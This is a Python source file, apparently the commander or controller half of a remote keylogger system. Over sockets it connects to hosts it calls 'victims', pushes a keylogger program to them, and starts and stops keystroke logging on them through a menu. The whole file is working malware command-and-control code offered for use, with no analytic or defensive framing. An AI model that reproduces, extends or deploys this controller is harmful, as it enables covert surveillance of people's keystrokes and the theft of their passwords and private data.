import select
from commander_utils import *

if __name__ == '__main__':
    # Initialization + GetOpts
    source_ip, source_port, destination_ip, destination_port = parse_arguments()

    # Initialize server socket and socket lists
    server_socket = initialize_server_socket(source_ip, source_port)

    # List of sockets to monitor for readability (includes the server and stdin FDs)
    sockets_to_read = [server_socket, sys.stdin]

    # Initialize client list to keep track of connected client sockets and their addresses (IP, Port)
    # Key/Value Pair => [Socket] : (IP, Port)
    connected_clients = {}

    # Initial connect to victim as passed by argument (and put in sockets_to_read)
    print_config(destination_ip, destination_port, (source_ip, source_port))
    victim_socket = initial_connect_to_client(sockets_to_read, connected_clients, destination_ip,
                                              destination_port)

    # Display Menu
    display_menu()

    while True:
        # Use select to monitor multiple sockets
        readable, _, _ = select.select(sockets_to_read, [], [])

        # Display menu & prompt user selection
        command = get_menu_selection()

        for sock in readable:
            # a) Handle new connections
            if sock is server_socket:
                # This means there is a new incoming connection
                process_new_connections(server_socket, sockets_to_read, connected_clients)

            # b) Read from stdin file descriptor (Initiate Menu from keystroke)
            elif sock is sys.stdin:
                # MENU ITEM 1 - Start Keylogger
                if command == constants.PERFORM_MENU_ITEM_ONE:
                    print(constants.START_KEYLOG_INITIAL_MSG)

                    # a) Check if client list is empty
                    if len(connected_clients) == constants.ZERO:
                        print(constants.CLIENT_LIST_EMPTY_ERROR)
                        print(constants.RETURN_MAIN_MENU_MSG)
                        print(constants.MENU_CLOSING_BANNER)

                    # b) Handle single client in client list
                    if len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
                        # Get client socket
                        client_socket, (ip, port, is_keylogging) = next(iter(connected_clients.items()))

                        if is_keylogging:
                            print(constants.KEYLOG_STATUS_TRUE_ERROR.format(ip, port))
                            print(constants.KEYLOG_STATUS_TRUE_ERROR_SUGGEST)
                        else:
                            # Send signal to start keylog
                            print(constants.START_SEND_SIGNAL_MSG.format(constants.KEYLOG_FILE_NAME, ip, port))
                            client_socket.send(constants.START_KEYLOG_MSG.encode())

                            # Await OK signal from client
                            print(constants.AWAIT_START_RESPONSE_MSG)
                            ack = client_socket.recv(constants.BYTE_LIMIT).decode()

                            #  i) Check if keylogger.py is in victim's directory
                            try:
                                if ack == constants.RECEIVED_CONFIRMATION_MSG:
                                    print(constants.START_SIGNAL_RECEIVED_MSG.format(constants.KEYLOG_FILE_NAME))
                                    client_socket.send(constants.CHECK_KEYLOG.encode())

                                    print(constants.START_SIGNAL_SEND_FILE_NAME.format(constants.KEYLOG_FILE_NAME))
                                    client_socket.send(constants.KEYLOG_FILE_NAME.encode())

                                    # Get status
                                    print(constants.AWAIT_START_RESPONSE_MSG)
                                    status = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
                                    msg = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()

                                    if status == constants.STATUS_TRUE:
                                        print(constants.CLIENT_RESPONSE.format(msg))

                                        # Send signal to victim to start
                                        print(constants.START_SIGNAL_EXECUTE_KEYLOG.format(constants.KEYLOG_FILE_NAME))
                                        client_socket.send(constants.START_KEYLOG_MSG.encode())

                                        # Awaiting Response
                                        msg = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
                                        print(constants.CLIENT_RESPONSE.format(msg))

                                        # Replace the keylog status of the client in client dictionary to True
                                        connected_clients[client_socket] = (ip, port, True)

                                        print(constants.STOP_KEYLOG_SUGGESTION_MSG.format(ip, port))
                                        print(constants.RETURN_MAIN_MENU_MSG)
                                        print(constants.MENU_CLOSING_BANNER)
                                    else:
                                        print(constants.CLIENT_RESPONSE.format(msg))
                                        print(constants.MISSING_KEYLOG_FILE_SUGGEST_MSG)
                                        print(constants.RETURN_MAIN_MENU_MSG)
                                        print(constants.MENU_CLOSING_BANNER)

                            except Exception as e:
                                print(constants.KEYLOG_FILE_CHECK_ERROR.format(constants.KEYLOG_FILE_NAME, e))

                    # c) Handle any specific connected client in client list

                # MENU ITEM 2 - Stop Keylogger
                if command == constants.PERFORM_MENU_ITEM_TWO:
                    print(constants.STOP_KEYLOG_INITIAL_MSG)

                    # a) Check if client list is empty
                    if len(connected_clients) == constants.ZERO:
                        print(constants.CLIENT_LIST_EMPTY_ERROR)
                        print(constants.RETURN_MAIN_MENU_MSG)
                        print(constants.MENU_CLOSING_BANNER)

                    # b) Handle single client in client list
                    if len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
                        # Get client socket
                        client_socket, (ip, port, is_keylogging) = next(iter(connected_clients.items()))

                        # Check keylog status
                        if not is_keylogging:
                            print(constants.STOP_KEYLOG_STATUS_FALSE.format(ip, port))
                        else:
                            # Get signal from user to stop keylog on client/victim side
                            signal_to_stop = constants.ZERO
                            print(constants.STOP_KEYLOGGER_PROMPT)

                            while True:
                                try:
                                    signal_to_stop = int(input())
                                    if signal_to_stop == constants.PERFORM_MENU_ITEM_TWO:
                                        client_socket.send(constants.STOP_KEYWORD.encode())
                                        break
                                    print(constants.INVALID_INPUT_STOP_KEYLOGGER)
                                except ValueError as e:
                                    print(constants.INVALID_INPUT_STOP_KEYLOGGER)

                            # Await Results from keylogger on client/victim side (BLOCKING CALL)
                            result = client_socket.recv(constants.BYTE_LIMIT).decode().split("/")
                            result_status = result[0]
                            result_msg = result[1]

                            if result_status == constants.STATUS_TRUE:
                                print(constants.CLIENT_RESPONSE.format(result_msg))
                                print(constants.KEYLOG_OPERATION_SUCCESSFUL)

                                # Update client status
                                connected_clients[client_socket] = (ip, port, False)
                                print(constants.RETURN_MAIN_MENU_MSG)
                                print(constants.MENU_CLOSING_BANNER)
                            else:
                                print(constants.STOP_KEYLOG_RESULT_ERROR.format(result_msg))
                                print(constants.RETURN_MAIN_MENU_MSG)
                                print(constants.MENU_CLOSING_BANNER)

                # MENU ITEM 3 - Transfer keylog program to victim
                if command == constants.PERFORM_MENU_ITEM_THREE:
                    perform_menu_item_3(connected_clients)

                # MENU ITEM 5 - Disconnect from victim
                if command == constants.PERFORM_MENU_ITEM_FIVE:
                    disconnect_from_client(sockets_to_read, connected_clients)

                # MENU ITEM 12 - Connect to a specific victim
                if command == constants.PERFORM_MENU_ITEM_TWELVE:
                    _, target_socket, target_ip, target_port = connect_to_client_with_prompt(sockets_to_read,
                                                                                             connected_clients)

            #  c) If not server or stdin sockets, then handle data coming from clients
            else:
                # Data is available to read from an existing client connection
                data = sock.recv(constants.BYTE_LIMIT)
                if not data:
                    print("[+] Connection closed by", connected_clients[sock])
                    del connected_clients[sock]
                    sockets_to_read.remove(sock)
                else:
                    print("[+] Received from", connected_clients[sock], ":", data.decode())

                    # Broadcast the received message to all other connected clients
                    for client_sock in connected_clients:
                        if client_sock != sock:
                            try:
                                client_sock.send(data)
                            except Exception as e:
                                print("[+] Error broadcasting to", connected_clients[client_sock], ":", str(e))
